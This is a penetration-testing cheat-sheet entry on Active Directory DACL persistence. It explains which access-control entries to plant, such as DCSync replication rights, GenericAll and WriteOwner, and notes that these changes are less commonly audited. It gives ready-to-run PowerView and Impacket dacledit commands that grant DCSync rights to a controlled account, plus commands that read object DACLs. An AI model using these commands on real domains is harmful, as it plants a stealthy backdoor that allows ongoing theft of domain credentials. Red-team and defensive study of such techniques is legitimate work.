---
technique: DACL Persistence
category: persistence
targets: AD Objects, Domain
protocols: LDAP
remote_capable: true
tags: persistence dacl acl ace ldap powerview stealth
---

# DACL Persistence

Modifying DACLs (Discretionary Access Control Lists) on strategic AD objects, such as granting DCSync rights on the domain root, WriteOwner on privileged groups, or GenericAll on specific accounts, is a low-visibility persistence mechanism. Unlike group membership changes, DACL modifications are less commonly audited and survive object-level cleanup.

Key ACEs to target for persistence:
- DS-Replication-Get-Changes / DS-Replication-Get-Changes-All on the domain root (enables DCSync)
- GenericAll or GenericWrite on high-value accounts or groups
- WriteOwner on protected groups to regain control after SDProp cleanup

## Windows

PowerView provides direct DACL read and write primitives for any AD object.

### Add-DomainObjectAcl (PowerView)

#powershell #powerview #dacl

Grant a controlled principal DCSync rights on the domain root object for persistent credential access.

```powershell title:"Grant DCSync rights on domain root with PowerView"
Add-DomainObjectAcl -TargetIdentity "$domain_dn" -PrincipalIdentity "$controlled_user" -Rights DCSync -Verbose
```
<!-- cheat
var domain_dn
var controlled_user
-->

### Get-DomainObjectAcl (PowerView)

#powershell #powerview #recon

Read the DACL of a target object to enumerate existing ACEs and confirm backdoors.

```powershell title:"Read object DACL with PowerView"
Get-DomainObjectAcl -Identity "$target_object" -ResolveGUIDs
```
<!-- cheat
var target_object
-->

## Linux

dacledit.py from Impacket provides DACL read and write over LDAP.

### dacledit (write DCSync)

#python #ldap #impacket

Grant DCSync rights to a controlled principal on the domain root object.

```sh title:"Grant DCSync rights on domain root with dacledit"
dacledit.py -action write -rights DCSync -principal "$controlled_user" -target-dn "$domain_dn" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_user
var domain_dn
-->

### dacledit (read)

#python #ldap #recon #impacket

Enumerate ACEs on a target object to identify existing DACL-based backdoors.

```sh title:"Read target object DACL with dacledit"
dacledit.py -action read -target-dn "$target_dn" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_dn
-->
